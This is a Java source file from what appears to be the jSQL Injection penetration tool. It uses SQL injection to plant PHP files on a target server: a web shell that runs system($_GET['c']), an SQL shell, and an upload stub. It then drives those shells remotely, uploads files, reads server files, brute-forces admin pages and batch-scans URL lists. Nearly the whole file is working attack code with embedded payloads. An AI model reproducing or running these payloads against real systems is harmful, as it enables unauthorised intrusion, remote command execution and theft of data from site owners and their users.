/*******************************************************************************
 * Copyhacked (H) 2012-2016.
 * This program and the accompanying materials
 * are made available under no term at all, use it like
 * you want, but share and discuss about it
 * every time possible with every body.
 * 
 * Contributors:
 *      ron190 at ymail dot com - initial implementation
 ******************************************************************************/
package com.jsql.model.accessible;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.Collections;
import java.util.EnumMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.commons.lang3.StringUtils;
import org.apache.log4j.Logger;

import com.jsql.model.InjectionModel;
import com.jsql.model.MediatorModel;
import com.jsql.model.bean.util.Request;
import com.jsql.model.bean.util.TypeHeader;
import com.jsql.model.bean.util.TypeRequest;
import com.jsql.model.exception.InjectionFailureException;
import com.jsql.model.exception.JSqlException;
import com.jsql.model.exception.StoppedByUserSlidingException;
import com.jsql.model.injection.method.MethodInjection;
import com.jsql.model.suspendable.SuspendableGetRows;
import com.jsql.model.suspendable.callable.ThreadFactoryCallable;
import com.jsql.util.ConnectionUtil;
import com.jsql.view.scan.ScanListTerminal;
import com.jsql.view.swing.MediatorGui;
import com.jsql.view.swing.list.ListItem;

/**
 * Ressource access object.
 * Get informations from file system, commands, webpage.
 */
public class RessourceAccess {
	
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = Logger.getRootLogger();

    /**
     * File name for web shell.
     */
    public static final String FILENAME_WEBSHELL = "."+ InjectionModel.VERSION_JSQL + ".jw.php";
    
    /**
     * File name for sql shell.
     */
    public static final String FILENAME_SQLSHELL = "."+ InjectionModel.VERSION_JSQL + ".js.php";
    
    /**
     * File name for upload form.
     */
    public static final String FILENAME_UPLOAD = "."+ InjectionModel.VERSION_JSQL + ".ju.php";
    
    /**
     * True if admin page sould stop, false otherwise.
     */
    private static boolean isSearchAdminStopped = false;
    
    /**
     * True if scan list sould stop, false otherwise.
     */
    private static boolean isScanStopped = false;

    /**
     * True if ongoing file reading must stop, false otherwise.
     * If true any new file read is cancelled at start.
     */
    private static boolean isSearchFileStopped = false;

    /**
     * True if current user has right to read file.
     */
    private static boolean readingIsAllowed = false;

    /**
     * List of ongoing jobs.
     */
    private static List<CallableFile> callablesReadFile = new ArrayList<>();

    // Utility class
    private RessourceAccess() {
        // not used
    }

    /**
     * Check if every page in the list responds 200 OK.
     * @param urlInjection
     * @param pageNames List of admin pages ot test
     * @throws InterruptedException
     */
    public static void createAdminPages(String urlInjection, List<ListItem> pageNames) throws InterruptedException {
        String urlWithoutProtocol = urlInjection.replaceAll("^https?://[^/]*", "");
        String urlProtocol = urlInjection.replace(urlWithoutProtocol, "");
        String urlWithoutFileName = urlWithoutProtocol.replaceAll("[^/]*$", "");
        
        List<String> directoryNames = new ArrayList<>();
        if (urlWithoutFileName.split("/").length == 0) {
            directoryNames.add("/");
        }
        for (String directoryName: urlWithoutFileName.split("/")) {
            directoryNames.add(directoryName +"/");
        }
        
        ExecutorService taskExecutor = Executors.newFixedThreadPool(10, new ThreadFactoryCallable("CallableGetAdminPage"));
        CompletionService<CallableAdminPage> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);
        
        StringBuilder urlPart = new StringBuilder();
        for (String segment: directoryNames) {
            urlPart.append(segment);
            for (ListItem pageName: pageNames) {
                taskCompletionService.submit(new CallableAdminPage(urlProtocol + urlPart.toString() + pageName.toString()));
            }
        }

        int nbAdminPagesFound = 0;
        int submittedTasks = directoryNames.size() * pageNames.size();
        int tasksHandled;
        for (
            tasksHandled = 0;
            tasksHandled < submittedTasks && !RessourceAccess.isSearchAdminStopped;
            tasksHandled++
        ) {
            try {
                CallableAdminPage currentCallable = taskCompletionService.take().get();
                if (currentCallable.isHttpResponseOk()) {
                    Request request = new Request();
                    request.setMessage(TypeRequest.CREATE_ADMIN_PAGE_TAB);
                    request.setParameters(currentCallable.getUrl());
                    MediatorModel.model().sendToViews(request);

                    nbAdminPagesFound++;
                }
            } catch (InterruptedException | ExecutionException e) {
                LOGGER.error("Interruption while checking Admin pages", e);
            }
        }

        taskExecutor.shutdown();
        taskExecutor.awaitTermination(5, TimeUnit.SECONDS);

        RessourceAccess.isSearchAdminStopped = false;

        String result =
            "Found "+ nbAdminPagesFound +" page"+( nbAdminPagesFound > 1 ? 's' : "" )+" "
            + (tasksHandled != submittedTasks ? "of "+ tasksHandled +" processed " : "")
            + "on a total of "+ submittedTasks
        ;
        if (nbAdminPagesFound > 0) {
            LOGGER.debug(result);
        } else {
            LOGGER.trace(result);
        }

        Request request = new Request();
        request.setMessage(TypeRequest.END_ADMIN_SEARCH);
        MediatorModel.model().sendToViews(request);
    }
    
    /**
     * Create a webshell in the server.
     * @param pathShell Remote path othe file
     * @param url
     * @throws InjectionFailureException
     * @throws StoppedByUserSlidingException
     */
    public static void createWebShell(String pathShell, String urlShell) throws JSqlException {
        if (!RessourceAccess.isReadingAllowed()) {
            return;
        }
        
        String payloadWeb = "<"+ DataAccess.LEAD +"><?php system($_GET['c']); ?><"+ DataAccess.TRAIL +">";

        String pathShellFixed = pathShell;
        if (!pathShellFixed.matches(".*/$")) {
            pathShellFixed += "/";
        }
        MediatorModel.model().injectWithoutIndex(
            MediatorModel.model().getVendor().instance().sqlTextIntoFile(payloadWeb, pathShellFixed + FILENAME_WEBSHELL)
        );

        String resultInjection;
        String[] sourcePage = {""};
        try {
            resultInjection = new SuspendableGetRows().run(
                MediatorModel.model().getVendor().instance().sqlFileRead(pathShellFixed + FILENAME_WEBSHELL),
                sourcePage,
                false,
                1,
                null
            );

            if ("".equals(resultInjection)) {
                throw new JSqlException("Payload integrity verification: Empty payload");
            }
        } catch (JSqlException e) {
            throw new JSqlException("Payload integrity verification failed: "+ sourcePage[0].trim().replaceAll("\\n", "\\\\\\n"), e);
        }
        
        String url = urlShell;
        if ("".equals(url)) {
            url = ConnectionUtil.getUrlBase().substring(0, ConnectionUtil.getUrlBase().lastIndexOf('/') + 1);
        }

        if (resultInjection.indexOf(payloadWeb) > -1) {
            LOGGER.info("Web payload deployed at \""+ url + FILENAME_WEBSHELL +"\" in \""+ pathShellFixed + FILENAME_WEBSHELL +"\"");
            
            Request request = new Request();
            request.setMessage(TypeRequest.CREATE_SHELL_TAB);
            request.setParameters(pathShellFixed, url);
            MediatorModel.model().sendToViews(request);
        } else {
            throw new JSqlException("Incorrect Web payload integrity: "+ sourcePage[0].trim().replaceAll("\\n", "\\\\\\n"));
        }
    }
    
    /**
     * 
     * @param urlCommand
     * @return
     * @throws IOException
     */
    private static String runCommandShell(String urlCommand) throws IOException {
        URLConnection connection;

        String url = urlCommand;
        connection = new URL(url).openConnection();
        connection.setReadTimeout(ConnectionUtil.TIMEOUT);
        connection.setConnectTimeout(ConnectionUtil.TIMEOUT);

        StringBuilder pageSource = new StringBuilder();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                pageSource.append(line + "\n");
            }
        }

        Matcher regexSearch = Pattern.compile("(?s)<"+ DataAccess.LEAD +">(.*)<"+ DataAccess.TRAIL +">").matcher(pageSource.toString());
        regexSearch.find();

        String result;
        // IllegalStateException #1544: catch incorrect execution
        try {
            result = regexSearch.group(1);
        } catch (IllegalStateException e) {
            // Fix return null from regex
            result = "";
            LOGGER.warn("Incorrect response from Web shell", e);
        }
        
        Map<TypeHeader, Object> msgHeader = new EnumMap<>(TypeHeader.class);
        msgHeader.put(TypeHeader.URL, url);
        msgHeader.put(TypeHeader.POST, "");
        msgHeader.put(TypeHeader.HEADER, "");
        msgHeader.put(TypeHeader.RESPONSE, ConnectionUtil.getHttpHeaders(connection));
        msgHeader.put(TypeHeader.SOURCE, pageSource.toString());
        
        Request request = new Request();
        request.setMessage(TypeRequest.MESSAGE_HEADER);
        request.setParameters(msgHeader);
        MediatorModel.model().sendToViews(request);
        
        // TODO optional
        return result;
    }
    
    /**
     * Run a shell command on host.
     * @param command The command to execute
     * @param uuidShell An unique identifier for terminal
     * @param urlShell Web path of the shell
     */
    public static void runWebShell(String command, UUID uuidShell, String urlShell) {
        String result = "";
        
        try {
            result = runCommandShell(
                urlShell + FILENAME_WEBSHELL + "?c="+ URLEncoder.encode(command.trim(), "ISO-8859-1")
            );
            
            if ("".equals(result)) {
                result = "No result.\nTry \""+ command.trim() +" 2>&1\" to get a system error message.\n";
            }
        } catch (UnsupportedEncodingException e) {
            LOGGER.warn("Encoding command to ISO-8859-1 failed: "+ e.getMessage(), e);
        } catch (IOException e) {
            LOGGER.warn("Shell execution error: "+ e.getMessage(), e);
        } finally {
            // Unfroze interface
            Request request = new Request();
            request.setMessage(TypeRequest.GET_WEB_SHELL_RESULT);
            request.setParameters(uuidShell, result);
            MediatorModel.model().sendToViews(request);
        }
    }

    /**
     * Create SQL shell on the server. Override user name and password eventually.
     * @param pathShell Script to create on the server
     * @param url URL for the script (used for url rewriting)
     * @param username User name for current database
     * @param password User password for current database
     * @throws InjectionFailureException
     * @throws StoppedByUserSlidingException
     */
    public static void createSqlShell(String pathShell, String urlShell, String username, String password) throws JSqlException {
        if (!RessourceAccess.isReadingAllowed()) {
            return;
        }
        
        String payloadSQL =
            "<"+ DataAccess.LEAD +"><?php mysql_connect('localhost',$_GET['u'],$_GET['p']);"
                + "$result=mysql_query($r=$_GET['q'])or die('<SQLe>Query failed: '.mysql_error().'<"+ DataAccess.TRAIL +">');"
                + "if(is_resource($result)){"
                    + "echo'<SQLr>';"
                    + "while($row=mysql_fetch_array($result,MYSQL_NUM))echo'<tr><td>',join('</td><td>',$row),'</td></tr>';"
                + "}else if($result==TRUE)echo'<SQLm>Query OK: ',mysql_affected_rows(),' row(s) affected';"
                + "else if($result==FALSE)echo'<SQLm>Query failed';"
            + " ?><"+ DataAccess.TRAIL +">";

        String pathShellFixed = pathShell;
        if (!pathShellFixed.matches(".*/$")) {
            pathShellFixed += "/";
        }
        
        MediatorModel.model().injectWithoutIndex(
            MediatorModel.model().getVendor().instance().sqlTextIntoFile(payloadSQL, pathShellFixed + FILENAME_SQLSHELL)
        );

        String resultInjection = "";
        String[] sourcePage = {""};
        try {
            resultInjection = new SuspendableGetRows().run(
                MediatorModel.model().getVendor().instance().sqlFileRead(pathShellFixed + FILENAME_SQLSHELL),
                sourcePage,
                false,
                1,
                null
            );
            
            if ("".equals(resultInjection)) {
                throw new JSqlException("Bad payload integrity: Empty payload");
            }
        } catch (JSqlException e) {
            throw new JSqlException("Payload integrity verification failed: "+ sourcePage[0].trim().replaceAll("\\n", "\\\\\\n"), e);
        }
        
        String url = urlShell;
        if ("".equals(url)) {
            url = ConnectionUtil.getUrlBase().substring(0, ConnectionUtil.getUrlBase().lastIndexOf('/') + 1);
        }

        if (resultInjection.indexOf(payloadSQL) > -1) {
            LOGGER.info("SQL payload deployed at \""+ url + FILENAME_SQLSHELL +"\" in \""+ pathShellFixed + FILENAME_SQLSHELL +"\"");
            
            Request request = new Request();
            request.setMessage(TypeRequest.CREATE_SQL_SHELL_TAB);
            request.setParameters(pathShellFixed, url, username, password);
            MediatorModel.model().sendToViews(request);
        } else {
            throw new JSqlException("Incorrect SQL payload integrity: "+ sourcePage[0].trim().replaceAll("\\n", "\\\\\\n"));
        }
    }

    /**
     * Execute SQL request into terminal defined by URL path, eventually override with database user/pass identifiers.
     * @param command SQL request to execute
     * @param uuidShell Identifier of terminal sending the request
     * @param urlShell URL to send SQL request against
     * @param username User name [optional]
     * @param password USEr password [optional]
     */
    public static void runSqlShell(String command, UUID uuidShell, String urlShell, String username, String password) {
        String result = "";
        try {
            result = runCommandShell(
                urlShell + FILENAME_SQLSHELL +"?q="+ URLEncoder.encode(command.trim(), "ISO-8859-1") +"&u="+ username +"&p="+ password
            );
            
            if (result.indexOf("<SQLr>") > -1) {
                List<List<String>> listRows = new ArrayList<>();
                Matcher rowsMatcher = Pattern.compile("(?si)<tr>(<td>.*?</td>)</tr>").matcher(result);
                while (rowsMatcher.find()) {
                    String values = rowsMatcher.group(1);

                    Matcher fieldsMatcher = Pattern.compile("(?si)<td>(.*?)</td>").matcher(values);
                    List<String> listFields = new ArrayList<>();
                    listRows.add(listFields);
                    while (fieldsMatcher.find()) {
                        String field = fieldsMatcher.group(1);
                        listFields.add(field);
                    }
                }

                if (!listRows.isEmpty()) {
                    List<Integer> listFieldsLength = new ArrayList<>();
                    for (
                        final int[] indexLongestRowSearch = {0};
                        indexLongestRowSearch[0] < listRows.get(0).size();
                        indexLongestRowSearch[0]++
                    ) {
                        Collections.sort(
                            listRows,
                            (firstRow, secondRow) -> secondRow.get(indexLongestRowSearch[0]).length() - firstRow.get(indexLongestRowSearch[0]).length()
                        );

                        listFieldsLength.add(listRows.get(0).get(indexLongestRowSearch[0]).length());
                    }

                    if (!"".equals(result)) {
                        StringBuilder tableText = new StringBuilder("+");
                        for (Integer fieldLength: listFieldsLength) {
                            tableText.append("-"+ StringUtils.repeat("-", fieldLength) +"-+");
                        }
                        tableText.append("\n");

                        for (List<String> listFields: listRows) {
                            tableText.append("|");
                            int cursorPosition = 0;
                            for (String field: listFields) {
                                tableText.append(" "+ field + StringUtils.repeat(" ", listFieldsLength.get(cursorPosition) - field.length()) +" |");
                                cursorPosition++;
                            }
                            tableText.append("\n");
                        }

                        tableText.append("+");
                        for (Integer fieldLength: listFieldsLength) {
                            tableText.append("-"+ StringUtils.repeat("-", fieldLength) +"-+");
                        }
                        tableText.append("\n");
                        
                        result = tableText.toString();
                    }
                }
            } else if (result.indexOf("<SQLm>") > -1) {
                result = result.replace("<SQLm>", "") + "\n";
            } else if (result.indexOf("<SQLe>") > -1) {
                result = result.replace("<SQLe>", "") + "\n";
            }
        } catch (UnsupportedEncodingException e) {
            LOGGER.warn("Encoding command to ISO-8859-1 failed: "+ e.getMessage(), e);
        } catch (IOException e) {
            LOGGER.warn("Shell execution error: "+ e.getMessage(), e);
        } finally {
            // Unfroze interface
            Request request = new Request();
            request.setMessage(TypeRequest.GET_SQL_SHELL_RESULT);
            request.setParameters(uuidShell, result, command);
            MediatorModel.model().sendToViews(request);
        }
    }

    /**
     * Upload a file to the server.
     * @param pathFile Remote path of the file to upload
     * @param urlFile URL of uploaded file
     * @param file File to upload
     * @throws JSqlException
     * @throws IOException
     */
    public static void uploadFile(String pathFile, String urlFile, File file) throws JSqlException, IOException {
        if (!RessourceAccess.isReadingAllowed()) {
            return;
        }
        
        String sourceShellToInject = "<?php echo move_uploaded_file($_FILES['u']['tmp_name'], getcwd().'/'.basename($_FILES['u']['name']))?'"+ DataAccess.LEAD +"y':'n'; ?>";

        String pathShellFixed = pathFile;
        if (!pathShellFixed.matches(".*/$")) {
            pathShellFixed += "/";
        }
        
        MediatorModel.model().injectWithoutIndex(
            MediatorModel.model().getVendor().instance().sqlTextIntoFile("<"+ DataAccess.LEAD +">"+ sourceShellToInject +"<"+ DataAccess.TRAIL +">", pathShellFixed + FILENAME_UPLOAD)
        );

        String[] sourcePage = {""};
        String sourceShellInjected;
        try {
            sourceShellInjected = new SuspendableGetRows().run(
                MediatorModel.model().getVendor().instance().sqlFileRead(pathShellFixed + FILENAME_UPLOAD),
                sourcePage,
                false,
                1,
                null
            );
            
            if ("".equals(sourceShellInjected)) {
                throw new JSqlException("Bad payload integrity: Empty payload");
            }
        } catch (JSqlException e) {
            throw new JSqlException("Payload integrity verification failed: "+ sourcePage[0].trim().replaceAll("\\n", "\\\\\\n"), e);
        }

        String urlFileFixed = urlFile;
        if ("".equals(urlFileFixed)) {
            urlFileFixed = ConnectionUtil.getUrlBase().substring(0, ConnectionUtil.getUrlBase().lastIndexOf('/') + 1);
        }
        
        if (sourceShellInjected.indexOf(sourceShellToInject) > -1) {
            LOGGER.info("Upload payload deployed at \""+ urlFileFixed + FILENAME_UPLOAD +"\" in \""+ pathShellFixed + FILENAME_UPLOAD +"\"");
            
            String crLf = "\r\n";
            
            URL urlUploadShell = new URL(urlFileFixed +"/"+ FILENAME_UPLOAD);
            URLConnection connection = urlUploadShell.openConnection();
            connection.setDoOutput(true);
            
            try (
                InputStream streamToUpload = new FileInputStream(file);
            ) {

                byte[] streamData = new byte[streamToUpload.available()];
                if (streamToUpload.read(streamData) == -1) {
                    throw new JSqlException("Error reading the file");
                }
                
                String headerForm = "";
                headerForm += "-----------------------------4664151417711"+ crLf;
                headerForm += "Content-Disposition: form-data; name=\"u\"; filename=\""+ file.getName() +"\""+ crLf;
                headerForm += "Content-Type: binary/octet-stream"+ crLf;
                headerForm += crLf;

                String headerFile = "";
                headerFile += crLf +"-----------------------------4664151417711--"+ crLf;

                connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=---------------------------4664151417711");
                connection.setRequestProperty("Content-Length", String.valueOf(headerForm.length() + headerFile.length() + streamData.length));

                try (
                    OutputStream streamOutputFile = connection.getOutputStream();
                ) {
                    streamOutputFile.write(headerForm.getBytes());
    
                    int index = 0;
                    int size = 1024;
                    do {
                        if (index + size > streamData.length) {
                            size = streamData.length - index;
                        }
                        streamOutputFile.write(streamData, index, size);
                        index += size;
                    } while (index < streamData.length);
    
                    streamOutputFile.write(headerFile.getBytes());
                    streamOutputFile.flush();
                }
                
                try (
                    InputStream streamInputFile = connection.getInputStream();
                ) {
                    char buff = 512;
                    int len;
                    byte[] data = new byte[buff];
                    StringBuilder result = new StringBuilder();
                    do {
                        len = streamInputFile.read(data);
    
                        if (len > 0) {
                            result.append(new String(data, 0, len));
                        }
                    } while (len > 0);
    
                    if (result.indexOf(DataAccess.LEAD +"y") > -1) {
                        LOGGER.debug("Upload successful");
                    } else {
                        LOGGER.warn("Upload failed");
                    }
                    
                    Map<TypeHeader, Object> msgHeader = new EnumMap<>(TypeHeader.class);
                    msgHeader.put(TypeHeader.URL, urlFileFixed);
                    msgHeader.put(TypeHeader.POST, "");
                    msgHeader.put(TypeHeader.HEADER, "");
                    msgHeader.put(TypeHeader.RESPONSE, ConnectionUtil.getHttpHeaders(connection));
                    msgHeader.put(TypeHeader.SOURCE, result.toString());
    
                    Request request = new Request();
                    request.setMessage(TypeRequest.MESSAGE_HEADER);
                    request.setParameters(msgHeader);
                    MediatorModel.model().sendToViews(request);
                }
            }
        } else {
            throw new JSqlException("Incorrect Upload payload integrity: "+ sourcePage[0].trim().replaceAll("\\n", "\\\\\\n"));
        }
        
        Request request = new Request();
        request.setMessage(TypeRequest.END_UPLOAD);
        MediatorModel.model().sendToViews(request);
    }
    
    /**
     * Check if current user can read files.
     * @return True if user can read file, false otherwise
     * @throws JSqlException when an error occurs during injection
     */
    public static boolean isReadingAllowed() throws JSqlException {
        String[] sourcePage = {""};

        String resultInjection = new SuspendableGetRows().run(
            MediatorModel.model().getVendor().instance().sqlPrivilegeTest(),
            sourcePage,
            false,
            1,
            null
        );

        if ("".equals(resultInjection)) {
            MediatorModel.model().sendResponseFromSite("Can't read privilege", sourcePage[0].trim());
            Request request = new Request();
            request.setMessage(TypeRequest.MARK_FILE_SYSTEM_INVULNERABLE);
            MediatorModel.model().sendToViews(request);
            RessourceAccess.readingIsAllowed = false;
        } else if ("false".equals(resultInjection)) {
            LOGGER.warn("No FILE privilege");
            Request request = new Request();
            request.setMessage(TypeRequest.MARK_FILE_SYSTEM_INVULNERABLE);
            MediatorModel.model().sendToViews(request);
            RessourceAccess.readingIsAllowed = false;
        } else {
            Request request = new Request();
            request.setMessage(TypeRequest.MARK_FILE_SYSTEM_VULNERABLE);
            MediatorModel.model().sendToViews(request);
            RessourceAccess.readingIsAllowed = true;
        }
        
        // TODO optional
        return RessourceAccess.readingIsAllowed;
    }
    
    /**
     * Attempt to read files in parallel by their path from the website using injection.
     * Reading file needs a FILE right on the server.
     * The user can interrupt the process at any time.
     * @param pathsFiles List of file paths to read
     * @throws JSqlException when an error occurs during injection
     * @throws InterruptedException if the current thread was interrupted while waiting
     * @throws ExecutionException if the computation threw an exception
     */
    public static void readFile(List<ListItem> pathsFiles) throws JSqlException, InterruptedException, ExecutionException {
        if (!RessourceAccess.isReadingAllowed()) {
            return;
        }

        int countFileFound = 0;
        ExecutorService taskExecutor = Executors.newFixedThreadPool(10, new ThreadFactoryCallable("CallableReadFile"));
        CompletionService<CallableFile> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);

        for (ListItem pathFile: pathsFiles) {
            CallableFile callableFile = new CallableFile(pathFile.toString());
            taskCompletionService.submit(callableFile);
            RessourceAccess.callablesReadFile.add(callableFile);
        }

        List<String> duplicate = new ArrayList<>();
        int submittedTasks = pathsFiles.size();
        int tasksHandled;
        for (
            tasksHandled = 0 ;
            tasksHandled < submittedTasks && !RessourceAccess.isSearchFileStopped ;
            tasksHandled++
        ) {
            CallableFile currentCallable = taskCompletionService.take().get();
            if (!"".equals(currentCallable.getSourceFile())) {
                String name = currentCallable.getPathFile().substring(currentCallable.getPathFile().lastIndexOf('/') + 1, currentCallable.getPathFile().length());
                String content = currentCallable.getSourceFile();
                String path = currentCallable.getPathFile();

                Request request = new Request();
                request.setMessage(TypeRequest.CREATE_FILE_TAB);
                request.setParameters(name, content, path);
                MediatorModel.model().sendToViews(request);

                if (!duplicate.contains(path.replace(name, ""))) {
                    LOGGER.info("Shell might be possible in folder "+ path.replace(name, ""));
                }
                duplicate.add(path.replace(name, ""));

                countFileFound++;
            }
        }
        
        // Force ongoing suspendables to stop immediately
        for (CallableFile callableReadFile: RessourceAccess.callablesReadFile) {
            callableReadFile.getSuspendableReadFile().stop();
        }
        RessourceAccess.callablesReadFile.clear();

        taskExecutor.shutdown();
        taskExecutor.awaitTermination(5, TimeUnit.SECONDS);
        
        RessourceAccess.isSearchFileStopped = false;
        
        String result =
            "Found "+ countFileFound +" file"+( countFileFound > 1 ? 's' : "" )+" "
            + (tasksHandled != submittedTasks ? "of "+ tasksHandled +" processed " : "")
            + "on a total of "+ submittedTasks
        ;
        if (countFileFound > 0) {
            LOGGER.debug(result);
        } else {
            LOGGER.trace(result);
        }
        
        Request request = new Request();
        request.setMessage(TypeRequest.END_FILE_SEARCH);
        MediatorModel.model().sendToViews(request);
    }
    
    /**
     * Start fast scan of URLs in sequence and display result.
     * Unplug any existing view and plug a console-like view in order to
     * respond appropriately to GUI message with simple text result instead of
     * build complex graphical components during the multi website injections.
     * At the end of the scan it plugs again the normal view.
     * @param urlList contains a list of String URL
     */
    public static void scanList(List<ListItem> urlList) {
        // Erase everything in the view from a previous injection
        Request requests = new Request();
        requests.setMessage(TypeRequest.RESET_INTERFACE);
        MediatorModel.model().sendToViews(requests);
        
        // wait for ending of ongoing interaction between two injections
        try {
            Thread.sleep(500);
        } catch (InterruptedException e) {
            LOGGER.error("Interruption while sleeping during scan", e);
            Thread.currentThread().interrupt();
        }

        // Display result only in console
        MediatorModel.model().deleteObservers();
        MediatorModel.model().addObserver(new ScanListTerminal());
        
        MediatorModel.model().setIsScanning(true);
        RessourceAccess.isScanStopped = false;
        
        for (ListItem url: urlList) {
            if (MediatorModel.model().isStoppedByUser() || RessourceAccess.isScanStopped) {
                break;
            }
            LOGGER.info("Scanning "+ url);
            MediatorModel.model().controlInput(url.toString(), "", "", MethodInjection.QUERY, "POST", true);
            
            try {
                Thread.sleep(500);
            } catch (InterruptedException e) {
                LOGGER.error("Interruption while sleeping between two scans", e);
                Thread.currentThread().interrupt();
            }
        }
        
        // Get back the normal view
        // TODO Don't play with View on Model
        MediatorModel.model().addObserver(MediatorGui.frame().getObserver());
        
        MediatorModel.model().setIsScanning(false);
        MediatorModel.model().setIsStoppedByUser(false);
        RessourceAccess.isScanStopped = false;

        Request request = new Request();
        request.setMessage(TypeRequest.END_SCAN);
        MediatorModel.model().sendToViews(request);
    }

    /**
     * Mark the search of files to stop.
     * Any ongoing file reading is interrupted and any new file read
     * is cancelled.
     */
    public static void stopSearchingFile() {
        RessourceAccess.isSearchFileStopped = true;
        
        // Force ongoing suspendable to stop immediately
        for (CallableFile callable: RessourceAccess.callablesReadFile) {
            callable.getSuspendableReadFile().stop();
        }
    }
    
    // Getters and setters
    
    public static boolean isSearchAdminStopped() {
        return RessourceAccess.isSearchAdminStopped;
    }

    public static void setSearchAdminStopped(boolean isSearchAdminStopped) {
        RessourceAccess.isSearchAdminStopped = isSearchAdminStopped;
    }
    
    public static void setScanStopped(boolean isScanStopped) {
        RessourceAccess.isScanStopped = isScanStopped;
    }

    public static boolean isReadingIsAllowed() {
        return RessourceAccess.readingIsAllowed;
    }

    public static void setReadingIsAllowed(boolean readingIsAllowed) {
        RessourceAccess.readingIsAllowed = readingIsAllowed;
    }
    
}
